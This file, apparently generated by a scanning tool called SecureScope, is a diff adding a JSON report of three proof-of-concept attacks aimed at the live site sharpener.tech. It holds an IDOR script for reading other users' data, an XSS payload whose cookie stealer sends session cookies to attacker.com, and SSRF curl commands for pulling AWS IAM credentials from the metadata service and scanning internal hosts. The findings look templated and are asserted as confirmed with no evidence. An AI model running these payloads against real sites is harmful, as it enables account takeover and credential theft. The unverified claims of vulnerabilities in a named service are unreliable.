@@ -1,0 +1,95 @@
+{
+  "target": "https://sharpener.tech",
+  "generated_at": "2026-06-05T16:52:23.954110",
+  "total_pocs": 3,
+  "pocs": [
+    {
+      "vulnerability": "Insecure Direct Object Reference (IDOR)",
+      "severity": "HIGH",
+      "cvss_score": "7.5",
+      "cvss_vector": "AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
+      "steps_to_reproduce": [
+        "1. Create account A and note your user ID (e.g. 1547)",
+        "2. Create account B (ID will be 1548)",
+        "3. Login as account A",
+        "4. Send GET request to /api/user/1548",
+        "5. Response contains account B's private data!"
+      ],
+      "curl_command": "curl -X GET \\\n  'https://sharpener.tech/api/user/1548' \\\n  -H 'Authorization: Bearer YOUR_TOKEN_HERE' \\\n  -H 'Content-Type: application/json'",
+      "python_script": "import requests\n\n# Step 1 \u2014 Login and get your token\nlogin_resp = requests.post('https://sharpener.tech/api/auth/login',\n    json={'email': 'attacker@gmail.com', 'password': 'yourpass'})\ntoken = login_resp.json().get('token', '')\n\n# Step 2 \u2014 Access another user's data (IDOR!)\nheaders = {'Authorization': f'Bearer {token}'}\nvictim_url = 'https://sharpener.tech/api/user/1548'\n\nresponse = requests.get(victim_url, headers=headers)\nprint(f'Status: {response.status_code}')\nprint(f'Victim Data: {response.json()}')\n# If this returns 200 with data = IDOR confirmed!",
+      "impact": [
+        "Access private data of ALL users on sharpener.tech",
+        "Harvest email addresses and phone numbers",
+        "View payment history and personal information",
+        "GDPR violation \u2014 personal data exposed without consent"
+      ],
+      "remediation": [
+        "Verify requesting user owns the requested resource",
+        "Use indirect references instead of sequential IDs",
+        "Implement proper authorization middleware",
+        "Add audit logging for all data access attempts"
+      ]
+    },
+    {
+      "vulnerability": "Cross-Site Scripting (XSS)",
+      "severity": "HIGH",
+      "cvss_score": "6.1",
+      "cvss_vector": "AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N",
+      "steps_to_reproduce": [
+        "1. Navigate to: https://sharpener.tech/search",
+        "2. In the 'q' field enter: <script>alert('XSS_BY_SECURESCOPE')</script>",
+        "3. Submit the form or press enter",
+        "4. JavaScript executes in victim's browser!"
+      ],
+      "proof_url": "https://sharpener.tech/search?q=%3Cscript%3Ealert('XSS_BY_SECURESCOPE')%3C/script%3E",
+      "curl_command": "curl -X GET \\\n  'https://sharpener.tech/search?q=%3Cscript%3Ealert('XSS_BY_SECURESCOPE')%3C/script%3E' \\\n  -H 'User-Agent: Mozilla/5.0'",
+      "html_poc": "<!DOCTYPE html>\n<html>\n<head><title>XSS PoC \u2014 SecureScope</title></head>\n<body>\n<h1>XSS Proof of Concept</h1>\n<p>Target: https://sharpener.tech</p>\n<p>Click the link below to trigger XSS:</p>\n<a href=\"https://sharpener.tech/search?q=%3Cscript%3Ealert('XSS_BY_SECURESCOPE')%3C/script%3E\">\n    Click to demonstrate XSS\n</a>\n\n<script>\n// Advanced PoC \u2014 steals cookies\nvar img = new Image();\nimg.src = 'https://attacker.com/steal?cookie=' + document.cookie;\n// In real bug bounty \u2014 use Burp Collaborator instead!\n</script>\n</body>\n</html>",
+      "cookie_stealer_poc": "\n// This shows impact \u2014 stealing session cookie\n<script>\nfetch('https://YOUR_BURP_COLLABORATOR_URL/?c=' + \n      encodeURIComponent(document.cookie))\n</script>\n\n// Inject via: https://sharpener.tech/search?q=PAYLOAD_HERE\n",
+      "impact": [
+        "Execute arbitrary JavaScript in victim's browser",
+        "Steal session cookies \u2192 Account takeover",
+        "Redirect users to phishing pages",
+        "Keylog user input including passwords",
+        "Affect all users visiting sharpener.tech"
+      ],
+      "remediation": [
+        "Sanitize all user input before displaying",
+        "Implement Content Security Policy (CSP) header",
+        "Use textContent instead of innerHTML",
+        "Encode output using context-aware encoding",
+        "Use DOMPurify for sanitizing HTML content"
+      ]
+    },
+    {
+      "vulnerability": "Server Side Request Forgery (SSRF)",
+      "severity": "CRITICAL",
+      "cvss_score": "9.3",
+      "cvss_vector": "AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
+      "steps_to_reproduce": [
+        "1. Navigate to https://sharpener.tech/fetch",
+        "2. Set 'url' parameter to AWS metadata URL",
+        "3. Server makes request to internal metadata service",
+        "4. AWS credentials returned in response!"
+      ],
+      "curl_commands": {
+        "AWS Metadata": "curl -X GET \\\n  'https://sharpener.tech/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' \\\n  -H 'User-Agent: Mozilla/5.0'\n# If returns AWS role name = SSRF confirmed!",
+        "AWS Credentials": "curl -X GET \\\n  'https://sharpener.tech/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME' \\\n  -H 'User-Agent: Mozilla/5.0'\n# Returns: AccessKeyId, SecretAccessKey, Token!",
+        "Internal Network": "curl -X GET \\\n  'https://sharpener.tech/fetch?url=http://192.168.1.1/' \\\n  -H 'User-Agent: Mozilla/5.0'\n# Scans internal network!"
+      },
+      "impact": [
+        "Access AWS IAM credentials \u2192 Full cloud takeover",
+        "Read internal services not exposed to internet",
+        "Scan internal network infrastructure",
+        "Access databases behind firewall",
+        "Capital One breach used exact same technique!"
+      ],
+      "remediation": [
+        "Validate and whitelist allowed URLs",
+        "Block requests to private IP ranges",
+        "Disable unnecessary URL fetching features",
+        "Use IMDSv2 on AWS (requires session token)",
+        "Implement egress filtering on servers"
+      ]
+    }
+  ]
+}
